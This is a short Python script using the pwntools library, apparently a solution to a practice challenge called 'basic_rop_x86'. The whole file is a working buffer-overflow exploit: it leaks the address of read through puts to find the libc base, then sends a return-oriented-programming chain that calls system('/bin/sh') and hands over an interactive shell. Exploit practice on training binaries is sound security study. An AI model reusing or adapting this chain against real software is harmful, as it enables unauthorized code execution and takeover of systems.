from pwn import *

p = process('./basic_rop_x86')
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')

main_addr = e.symbols['main']

ret = 0x80483c2
pop_edi_ebp = 0x804868a
pop_ebp_ret = 0x804868b

read_got = e.got['read']
puts_plt = e.plt['puts']
puts_got = e.got['puts']

payload = b"a"*0x48
payload += p32(puts_plt)
payload += p32(pop_ebp_ret)
payload += p32(read_got)
payload += p32(main_addr)
p.send(payload)

p.recvuntil(b"a"*0x40)
read_mapped = u32(p.recv(4))
print(hex(read_mapped))

libc_base = read_mapped - libc.symbols['read']
shell = libc_base + list(libc.search(b'/bin/sh'))[0]
system = libc_base + libc.symbols['system']

payload = b"a"*0x48
payload += p32(system)
payload += p32(pop_ebp_ret)
payload += p32(shell)
p.send(payload)

p.interactive()